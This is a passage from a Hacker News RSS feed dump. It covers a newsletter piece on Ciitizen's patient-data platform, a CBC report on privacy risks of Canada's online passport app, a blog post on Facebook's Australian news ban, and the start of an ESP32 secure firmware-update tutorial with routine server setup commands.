etc.). The ML pipeline automatically parses unstructured text into semantically normalized data informed by Ciitizen’s multidimensional data models. Ciitizen then leverages clinical experts to quality control and make sure all the important fields are correctly placed and coded. This is that research-grade stuff, Heisenberg quality data.</p><p>Here is a general overview of the process. It has that newsletter-cute handwritten aesthetic. Shout out to Brian C, Ciitizen co-founder and czar of all things bioinformatics who did his best to explain this to my smooth-brained self.&nbsp;</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F4db403a5-44e9-4857-8109-ca1095b18d22_671x248.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F4db403a5-44e9-4857-8109-ca1095b18d22_671x248.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/4db403a5-44e9-4857-8109-ca1095b18d22_671x248.png&quot;,&quot;height&quot;:248,&quot;width&quot;:671,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F819eee1a-8a15-407d-8388-e304ac2b7fd0_1600x870.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F819eee1a-8a15-407d-8388-e304ac2b7fd0_1600x870.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/819eee1a-8a15-407d-8388-e304ac2b7fd0_1600x870.png&quot;,&quot;height&quot;:792,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>By focusing on getting the source documents, Ciitizen is aiming to get deeper data on (initially) targeted groups of patients. By starting with the source documents and choosing how they can structure it, Ciitizen has mapped the data (they called it “ontologies”) so that clinical concepts that mean the same thing are mapped together (e.g. acetaminophen and tylenol are mapped to the same thing, breast cancer and invasive ductal carcinoma will have a parent-child relationship, etc.). No more extremely janky SQL queries with 50 permutations of cancer in your WHERE clause to make sure you got it all.&nbsp;</p><p>One question is whether this technology is defensible, and if improvements in off-the-shelf machine learning packages won’t make it easy for another company to copy. There’s a lot of focus on clinical natural language processing, which tons of companies are doing and which typically results in it finding words without much context. Data standardization is really the key differentiator. While the ability to ingest data and identify common text terms will become a commodity eventually, automating the accurate codification of this data to standard concepts based on the specific context of a patient's history is the hard part to replicate. Good biostatisticians make bank for a reason.</p><p>Ciitizen’s main bet is that their technology will effectively scale with as few humans as possible as more patients with different diseases use Ciitizen. The company started working with cancer patients, and has already moved into several other therapeutic areas. This is one of the core value-propositions of Ciitizen: it must work for everyone, globally. And if it requires a lot of humans to get the data, that’s going to be very expensive. “Calling an Uber on New Year’s” -expensive. So Ciitizen is going to have to leverage its AI and ML to expand into other therapeutic areas and industry verticals if it plans on doing it faster than its competitors.&nbsp;</p><h3><strong>The FHIR Extinguisher (Please don’t unsubscribe).</strong></h3><div><p>Ciitizen is also taking the interesting approach of not building exclusively on FHIR. You can read more about FHIR <a href="https://www.hl7.org/fhir/overview.html">here</a>, but the general gist is that FHIR creates a common data standard for healthcare organizations that outlines the types of data, their formats, the field name for that data, etc. so it’s easy to query via APIs. It’s sort of similar to how your web browser can go to any page and load because it knows we use standardized names for elements. </p><p>FHIR is still a relatively new concept slowly being rolled out. There are FHIR APIs that exist today, but historically there hasn’t been much guidance or pressure on types of data providers’ EMRs have to allow through them. However with new interoperability rules from the ONC, there will be a <a href="https://www.healthit.gov/isa/united-states-core-data-interoperability-uscdi">common set of data types</a> that are mandated to be available through FHIR v4 by 2022. Many apps are choosing to pull patient data out of EMRs using FHIR APIs to build personal health records.</p></div><p>Ciitizen has looked at FHIR and said “😬😬”. Their belief is that the current data that EMRs are required to put out through their APIs are missing research grade data that is relevant for complex diagnoses like cancer, including (but not limited to):</p><ul><li><p>CT/MRI, Images&nbsp;</p></li><li><p>Genetics/genomics&nbsp;</p></li><li><p>Tumor profiling details</p></li><li><p>Pathology and imaging reports&nbsp;</p></li><li><p>ECGs/device reading</p></li><li><p>Clinical Notes</p></li></ul><p>Some of these like clinical notes will be rolled out in 2022, assuming the date sticks and EMRs are compliant. Several of these other data fields are presumably going to be included <a href="https://www.healthit.gov/isa/united-states-core-data-interoperability-uscdi">in round 2</a> of interoperability requirements, but TBD on how long it will take for that to happen and rollout. So the timeline is up in the air on getting all the data types necessary for research, and even when it comes through it will be unstructured. FHIR is also not a global standard - and Ciitizen is thinking about what their eventual international expansion will look like (even if it’s early days).</p><p>Ciitizen’s CEO Anil Sethi kept repeating this line as I asked him to explain things to me so I feel …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://outofpocket.health/p/ciitizen-and-the-patient-data-marketplace">https://outofpocket.health/p/ciitizen-and-the-patient-data-marketplace</a></em></p>]]>
            </description>
            <link>https://outofpocket.health/p/ciitizen-and-the-patient-data-marketplace</link>
            <guid isPermaLink="false">hacker-news-small-sites-26223570</guid>
            <pubDate>Mon, 22 Feb 2021 12:08:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Minesweeper]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26223504">thread link</a>) | @madprops
<br/>
February 22, 2021 | https://madprops.github.io/minesweeper/ | <a href="https://web.archive.org/web/*/https://madprops.github.io/minesweeper/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://madprops.github.io/minesweeper/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26223504</guid>
            <pubDate>Mon, 22 Feb 2021 11:58:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virtual passport app presents real data risk, experts warn]]>
            </title>
            <description>
<![CDATA[
Score 115 | Comments 96 (<a href="https://news.ycombinator.com/item?id=26223347">thread link</a>) | @pseudolus
<br/>
February 22, 2021 | https://www.cbc.ca/news/canada/ottawa/passport-application-online-program-1.5920625 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/ottawa/passport-application-online-program-1.5920625">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Canadian privacy experts are concerned the federal government's plan to develop an online passport application process could put&nbsp;personal information at risk and open a new angle of attack for fraudsters.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.4612031.1536417303!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/passport.jpg"></p></div><figcaption>IBM Canada's digital passport application platform is expected to begin testing in three months, and could be ready for use as early as 2022.<!-- --> <!-- -->(John Badcock/CBC)</figcaption></figure><p><span><p>Canadian privacy experts are concerned the federal government's plan to develop an online passport application process could put&nbsp;personal information at risk and open a new angle of attack for fraudsters.</p>  <p>IBM Canada has been awarded the&nbsp;$1.5-million contract to create software that would allow Canadians to apply for a passport using their&nbsp;smartphones, tablets or&nbsp;computers.</p>  <p>The new platform would also allow applicants to&nbsp;pay fees and upload their passport photos securely, according to a statement from Immigration, Refugees and Citizenship Canada (IRCC).</p>    <blockquote><span><span><svg version="1.1" focusable="false" x="0px" y="0px" width="30px" height="25px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g><g><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g display="none"><g display="inline"> <path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg>They will attempt to&nbsp;exploit the program very quickly, very intensely to obtain the most fraudulent passports they can in the least amount of time.<svg focusable="false" x="0px" y="0px" width="23px" height="22px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g display="none"><g display="inline"><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g><g><path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg></span><cite>- Benoît&nbsp;Dupont, l'Université de Montréal</cite></span></blockquote>    <p>But privacy and data protection experts worry that personal information may be stored on foreign servers, providing an appealing target to criminals.</p>  <p>Sébastien Gambs, a professor in the information technology department of l'Université de Québec à Montréal&nbsp;and Canada Research Chair on privacy and data protection, said there are real&nbsp;concerns about&nbsp;where the data will be stored, a detail neither the government nor IBM Canada has divulged, though the tender identifies Amazon Web Services (AWS), the cloud computing branch of the American online retail giant.</p>  <p>"Even when we do business with an American company that agrees to store data within Canada, under the [U.S.] CLOUD Act, data could eventually be transferred out of the country," Gambs said in French.</p>  <p>In a statement, AWS said its clients retain full ownership and control of their data, including who may access that information.</p>  <p>In a separate statement, IRCC said "the privacy of Canadians and the safety of their personal information will be an absolute priority."</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5555269.1588631660!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/tech-cloud.JPG 300w,https://i.cbc.ca/1.5555269.1588631660!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/tech-cloud.JPG 460w,https://i.cbc.ca/1.5555269.1588631660!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/tech-cloud.JPG 620w,https://i.cbc.ca/1.5555269.1588631660!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/tech-cloud.JPG 780w,https://i.cbc.ca/1.5555269.1588631660!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/tech-cloud.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5555269.1588631660!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/tech-cloud.JPG"></p></div><figcaption>Amazon Web Services (AWS) says its clients retain full control over the data it stores.<!-- --> <!-- -->(Ivan Alvarado/Reuters)</figcaption></figure></span></p>  <h2>Canadian passports highly valued</h2>  <p>Benoît Dupont, a criminology professor at l'Université de Montréal and Canada Research Chair in cybersecurity, said the passport app will likely be a major target for fraudsters&nbsp;eager to get their hands on&nbsp;Canadian passports and the mobility that comes with them.</p>  <p>"That's very attractive for organized crime groups who specialize in human trafficking," Dupont said in French. "They will attempt to&nbsp;exploit the program very quickly, very intensely to obtain the most fraudulent passports they can in the least amount of time."</p>  <p>But&nbsp;Gambs said any virtual application will likely have extra&nbsp;steps built in to protect against hackers.</p>  <p>"As soon as we're doing things remotely, verifying somebody's identity becomes much more difficult," he said. "The government will definitely need to collect more personal information in order to verify an applicant's identity."</p>  <h2>'Vicious cycle': PIPSC</h2>  <p>The Professional Institute of the Public Services (PIPSC) said this tender should never have gone out to the private sector when it could have been developed in-house by public servants, as was done with the online tax portal.</p>  <p>"It's a vicious cycle. Instead of developing resources internally, we go externally," said&nbsp;Stéphane Aubry, vice-president of PIPSC. "Then we don't have the needed expertise internally,&nbsp;which&nbsp;unfortunately, over the years, fades and makes it so we need to contract out."</p>  <p>PIPSC said the project raises <a href="https://www.cbc.ca/news/canada/ottawa/phoenix-pay-system-cost-report-1.5138036">the spectre of the Phoenix pay system fiasco</a>, which also involved IBM.&nbsp;IBM Canada will be required to train and support IRCC employees in running the new passport system, according to the tender documents.</p>  <p>In 2020, the government issued just 897,401 passports, compared to 2.6 million the year before. For the first four months of the pandemic, Service Canada was only providing critical passport services for urgent travel.&nbsp;</p>  <p>Nevertheless, the Canadian Anti-Fraud Centre received 1,806 reports of passport-related fraud last year.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/ottawa/passport-application-online-program-1.5920625</link>
            <guid isPermaLink="false">hacker-news-small-sites-26223347</guid>
            <pubDate>Mon, 22 Feb 2021 11:36:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Anti-Democratic Exercise of Monopolistic Power]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26223310">thread link</a>) | @patrickdavidson
<br/>
February 22, 2021 | https://pancake.nz/blog/fbnewsban/ | <a href="https://web.archive.org/web/*/https://pancake.nz/blog/fbnewsban/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <p>Saturday, 20 February 2021</p>
        <p>On Thursday morning, in response to the proposed News Media and Digital Platforms Mandatory Bargaining Code in Australia, Facebook (with a "<a href="https://about.fb.com/news/2021/02/changes-to-sharing-and-viewing-news-on-facebook-in-australia/">heavy heart</a>") restricted the ability for any news to be shared by Australian users, and for Australian news to be shared by any users. Visiting an Australian news organisation's Facebook page would simply display "No posts yet".</p>
        <p><img src="https://pancake.nz/blog/fbnewsban/media/no-posts-yet.png" alt="An empty Australian news Facebook page"></p><p>If you look closely at the image above you will notice there are still two hyperlinks to news.com.au's website on the page, so technically it seems this could still be non-compliant with the proposed code.</p>
        <p>Attempting to post a link from an Australian news source, no matter where in the world the user is, would result in a popup, stating that "This post can't be shared".</p>
        <p><img src="https://pancake.nz/blog/fbnewsban/media/post-cant-be-shared.png" alt="Popup restricting the posting of Australian news"></p><p>Many people have been quick to label Facebook's actions as irresponsible and potentially harmful. Most of the initial criticism was due to the fact that whatever tool or algorithm Facebook had developed to remove news content had inadvertently removed content from "necessary" Facebook pages. Such as Government Health pages and the Bureau of Meteorology, which provides severe weather warnings. It doesn't stop there, Facebook wiped the pages of <a href="https://www.smh.com.au/national/facebook-news-ban-hits-emergency-services-and-government-health-departments-20210218-p573ks.html">many organisations</a> which should not have been caught up in the restrictions. Facebook blamed these issues on the broad definition of "news content" as defined in the proposed code, but quickly reinstated the wrongly blocked pages. They stopped short of <a href="https://www.abc.net.au/news/2021-02-18/facebook-unrepentant-scott-morrison-dubs-move-arrogant/13169340">apologising</a>, however.</p>
        <p>The more legitimate harm that Facebook's actions could cause is aiding in the spread of misinformation. Removing all news content from legitimate news sources but leaving up the unregulated content can do nothing but worsen the situation that Facebook has already been struggling to contain.</p>
        <p><img src="https://pancake.nz/blog/fbnewsban/media/fake-news.png" alt="A vandalised ad for Facebook"></p><p>As I mentioned in the first sentence of this post, Facebook took this action in response to the proposed News Media and Digital Platforms Mandatory Bargaining Code. Both <a href="https://about.fb.com/news/2020/08/changes-to-facebooks-services-in-australia/">Facebook</a> and <a href="https://about.google/google-in-australia/an-open-letter/">Google</a> have been strongly opposed to code since it was drafted in the latter half of 2020, and both threatened drastic action if their concerns about the code were not addressed. Their concerns were not addressed. So on Thursday Facebook followed through with their threat.</p>
        <h2>For the Code</h2>
        <p>The goal of the proposed code is to address the bargaining imbalance which exists between digital service providers (Facebook and Google) and news organisations. It aims to achieve this by forcing Facebook and Google to negotiate with news organisations for the right to distribute or link to their content. At the moment, whenever you search something on Google, the results you see not only include a link to the page, but also the title, an excerpt from the page, and in the case of some news content, an image.</p>
        <p><img src="https://pancake.nz/blog/fbnewsban/media/google-search.png" alt="A Google search result showing scraped content"></p><p>Google isn't paying anything to the respective organisations to show this content, and the Australian Government, along with the major media outlets, think they should.</p> 
        <p>Google Search makes money by showing ads alongside the actual search results. At the moment, none of that money is shared with the websites who's pages show up in the search results. The news organisations are only making money when a user actually clicks a link to their website, and gets to look at the news organisation's ads instead.</p>
        <p>Facebook engages in similar practices whenever a user shares a link. They scrape the website for the headline, an excerpt, and an image.</p>
        <p><img src="https://pancake.nz/blog/fbnewsban/media/facebook-scraping.png" alt="A Facebook post showing scraped content"></p><p>An example of an outraged New Zealand MP sharing a link to a news article on Facebook, which Facebook has scraped for the Headline, an excerpt, and an image.</p>
        <p>There is a key difference in Facebook's situation though, and that's the fact that it is not Facebook itself which is posting the links - it's its users. The implications of which I will explain later on.</p>
        <p>The key assumption here is that people are using the scraped content as a substitute for actually clicking the link and reading the article. In which case all the advertising revenue goes to Facebook or Google and none to the news organisation. You may be sitting there reading this thinking you are one of those people who always reads the actual article and not just the headline and therefore are supporting the news organisations directly, and you could be right. However that's almost missing the point. When you search something on Google and a bunch of news articles show up in the results you read most of the headlines and even some of the excerpts, and you definitely look at the images, but you may only click and read one of the articles. You have just consumed multiple organisation's content, but only the one you clicked on will get paid for it. This is what the code is aiming to address.</p>
        <h2>Against the Code</h2>
        <p>So the purpose of the code might actually make a lot of sense, Google and Facebook are directly making money from news organisation's content. So why are both companies so strongly opposed to the law?</p>
        <p>It turns out that when you take a closer look at the proposed code things seem to get a bit extreme. Firstly, the code doesn't just cover when Facebook or Google scrape content and reproduce it on their websites, it covers simply linking to the content. No scraping or reproducing needed. It seems a bit of a stretch that looking at a raw URL can be considered consuming content.</p>
        <p><img src="https://pancake.nz/blog/fbnewsban/media/simply-linking.png" alt="The part of the code which defines how content is made available"></p><p>The code's definition of "Making content available"</p>
        <p>Making a company pay to share links <a href="https://theconversation.com/webs-inventor-says-news-media-bargaining-code-could-break-the-internet-hes-right-but-theres-a-fix-153630">breaks a fundamental principle of the internet</a> - the ability to link freely. It would really suck if I had to pay every company who's website I've linked to in this article. In fact I would probably just not link at all if that were the case, and you would have no idea if I am actually referencing legitimate sources or just making things up as I go. I would effectively take the same action Facebook has, so maybe their position isn't so extreme after all.</p>
        <p>So why does this law only apply to Facebook and Google, and not to Twitter who partakes in the same scraping practices for its links, or even Facebook owned Instagram? Well it's because that's what the <a href="https://ministers.treasury.gov.au/ministers/josh-frydenberg-2018">Treasurer of Australia</a> has decided. Who this code applies to isn't metrics or rules based, it's simply up to who the Treasurer of Australia thinks it should apply to. The only guidelines the code lays out are what I've added below.</p>
        <p><img src="https://pancake.nz/blog/fbnewsban/media/law-applies.png" alt="Who the code applies to"></p><p>This is a lot of power to give to just one Minister, and it has more than just Google and Facebook concerned. Twitter also made a submission to the Australian Parliament, giving reasons why they too oppose the code. You can see all submissions regarding the code, both supporting and opposing, <a href="https://www.aph.gov.au/Parliamentary_Business/Committees/Senate/Economics/TLABNewsMedia/Submissions">here</a>.</p>
        <p>As I mentioned earlier, in Facebook's case, it is not Facebook which is posting links to news content, it's its users. Making Facebook pay for the content which its users post is an uncomfortable precedent to set. Especially when you consider that the users posting these links include the news organisations themselves. So Facebook would essentially be paying news organisations for providing them with a platform to promote themselves. Facebook evidently doesn't see enough value in hosting news content if they also have to pay for it.</p>
        <p><a href="https://about.fb.com/news/2021/02/changes-to-sharing-and-viewing-news-on-facebook-in-australia/">According to Facebook</a>, "News makes up less than 4% of the content people see in their News Feed". So it might not be a huge loss to Facebook if they remove news. Although the 4% quoted by Facebook will likely not directly translate into only a 4% loss of revenue, it's extremely hard to tell what the actual effect will be on Facebook and we will only find out over the coming months, assuming Facebook sticks with its decision, which it could easily not. In the same post, Facebook claims it "generated approximately 5.1 billion free referrals to Australian publishers worth an estimated AU$407 million". I'm no business expert but that seems like a lot of money for the Australian media to miss out on. Facebook also claims to have "delivered A$5.4 million to Australian publishers from revenue share programs, such as In-Stream Ads" not much, but it's worth noting, I guess. Of course the removal of news from Facebook won't mean the people who were clicking the links before will now just not read the news, they may now go directly to the outlet's website, instead of the Facebook page, possibly generating more revenue than if they went through Facebook. But this won't be the case for everyone, and how much of an impact this will have on news organisations is unclear. Founder of New Zealand media company <a href="https://thespinoff.co.nz/editorial-about-us-page/">The Spinoff</a> claims 15%-22% of their traffic comes from Facebook.</p>
        <blockquote data-conversation="none" data-dnt="true" data-theme="light"><p lang="en" dir="ltr">A little glimpse of how much Facebook traffic can impact an individual story / it fades fast, but typically provides 15%-22% of our traffic on a monthly basis. There will be multiple Australian publishers whose businesses will no longer be viable should this not pass. <a href="https://t.co/i8KZ8Sx8IS">pic.twitter.com/i8KZ8Sx8IS</a></p>— Duncan Greive (@duncangreive) <a href="https://twitter.com/duncangreive/status/1362160608502714368?ref_src=twsrc%5Etfw">February 17, 2021</a></blockquote> 
        <p>It's worth noting that The Spinoff is a digital-only media outlet targeted at a younger audience, so its numbers may not be representative of the media industry as a whole, but I wouldn't be surprised if most media outlets were at least in the same ballpark.</p>
        <p>In <a href="https://www.stuff.co.nz/business/industries/122048365/stuff-stops-all-activity-on-facebook-in-trial-inspired-by-principle">July 2020</a>, major New Zealand media outlet Stuff made the decision to stop all activity on Facebook. They claim to have done this for ethical reasons, and had previously stopped advertising on Facebook in response to how Facebook handled the terror attack in Christchurch in 2019. They claim this action was a trial, and six months on, Stuff still doesn't post to Facebook, so things must not have gone too poorly. It is important to note a key difference in this situation though, and that is that stuff.co.nz links are still allowed on Facebook, just Stuff themselves doesn't post them. So they will still have a percentage of their traffic coming from Facebook, although …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pancake.nz/blog/fbnewsban/">https://pancake.nz/blog/fbnewsban/</a></em></p>]]>
            </description>
            <link>https://pancake.nz/blog/fbnewsban/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26223310</guid>
            <pubDate>Mon, 22 Feb 2021 11:31:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tutorial for secure OTA (over the air) firmware update on the ESP32]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 4 (<a href="https://news.ycombinator.com/item?id=26223293">thread link</a>) | @hamica
<br/>
February 22, 2021 | https://www.lab4iot.com/2021/02/21/esp32-secure-firmware-update-over-the-air-ota/ | <a href="https://web.archive.org/web/*/https://www.lab4iot.com/2021/02/21/esp32-secure-firmware-update-over-the-air-ota/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<article>
								
<div><figure><img loading="lazy" width="684" height="912" src="https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_684,h_912/https://www.lab4iot.com/wp-content/uploads/2021/02/firmware_auto_update_esp32.jpg" alt="" title="ESP32 with LCD after automatic update" srcset="https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_684/https://www.lab4iot.com/wp-content/uploads/2021/02/firmware_auto_update_esp32.jpg 684w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_225/https://www.lab4iot.com/wp-content/uploads/2021/02/firmware_auto_update_esp32-225x300.jpg 225w" sizes="(max-width: 684px) 100vw, 684px"><figcaption>ESP32 after the automatic firmware update has completed.</figcaption></figure></div>



<p>Once you deploy your IoT device, you won’t have physical access to reprogram or update it. It is critical to plan ahead and to have a secure mechanism for updating your embedded system or IoT device. Sometimes you will have the requirement to update your IoT device because of a new feature update, security issues, bugs, you did not have enough time to finish something on time and you had to ship your device and etc.</p>



<p>Since we want to rely on existing and working software platforms, in this tutorial I will use the NGINX as a web server, “encrypted” traffic by an <strong>SSL certificate from Let’s Encrypt</strong>. I will use my test domain on <em>lab4iot.site</em>, I will describe everything in a <strong>step-by-step</strong> manner so that anyone can replicate and follow it. First, I will describe how to set up your domain and web server, then we will proceed with the ESP32 code. <strong>I present you with a basic Let’s Encrypt setup, it is not a production-ready setup but rather something to start you of. Let’s call it a proof of concept. The core point of the article is on the ESP32 part, however, the webserver setup is required. Keep that in mind!</strong></p>



<p>Before you start, make sure your DNS records are properly set:</p>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;showPanel&quot;:false,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">CNAME record: www to @
A record: * to your server IP address
A record: @ to your server IP address</pre></div>



<figure><img loading="lazy" width="1024" height="515" src="https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_1024,h_515/https://www.lab4iot.com/wp-content/uploads/2021/02/dns_records_setup-1024x515.jpg" alt="" srcset="https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_1024/https://www.lab4iot.com/wp-content/uploads/2021/02/dns_records_setup-1024x515.jpg 1024w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_300/https://www.lab4iot.com/wp-content/uploads/2021/02/dns_records_setup-300x151.jpg 300w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_768/https://www.lab4iot.com/wp-content/uploads/2021/02/dns_records_setup-768x386.jpg 768w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_1213/https://www.lab4iot.com/wp-content/uploads/2021/02/dns_records_setup.jpg 1213w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>My DNS records from my server </figcaption></figure>



<p>In this tutorial, I used Ubuntu Linux, feel free to use any other Linux distribution, maybe it will only differ in the used installation commands.</p>



<h2>Installing Nginx webserver and setting up the firewall</h2>



<p>First, make sure your Ubuntu is updated:</p>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">sudo apt-get update
sudo apt-get upgrade</pre></div>



<p>If there are packages to be installed, press Y to install them.</p>



<p>Then install Nginx, the webserver I am going to use in this tutorial:</p>







<p>Once you have installed it, check that your website is set up properly by going to it, lab4iot.site (your domain in this case.) You should see the default Nginx site that comes with it when it is installed. You will note, we are not yet using HTTPS but rather the unencrypted old protocol HTTP.</p>



<figure><img loading="lazy" width="1024" height="213" src="https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_1024,h_213/https://www.lab4iot.com/wp-content/uploads/2021/02/webserver_running-1-1024x213.jpg" alt="" srcset="https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_1024/https://www.lab4iot.com/wp-content/uploads/2021/02/webserver_running-1-1024x213.jpg 1024w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_300/https://www.lab4iot.com/wp-content/uploads/2021/02/webserver_running-1-300x62.jpg 300w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_768/https://www.lab4iot.com/wp-content/uploads/2021/02/webserver_running-1-768x160.jpg 768w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_1536/https://www.lab4iot.com/wp-content/uploads/2021/02/webserver_running-1-1536x320.jpg 1536w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_1719/https://www.lab4iot.com/wp-content/uploads/2021/02/webserver_running-1.jpg 1719w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Nginx is running and your traffic is not yet encrypted.</figcaption></figure>



<p>Let us set up the firewall so that only <strong>HTTPS (encrypted) traffic</strong> is allowed to and from your server, aside from your SSH connection. We will use the <strong>Uncomplicated Firewall</strong>, UFW. It should come preinstalled on Ubuntu.</p>







<p>Your response should look as the following:</p>



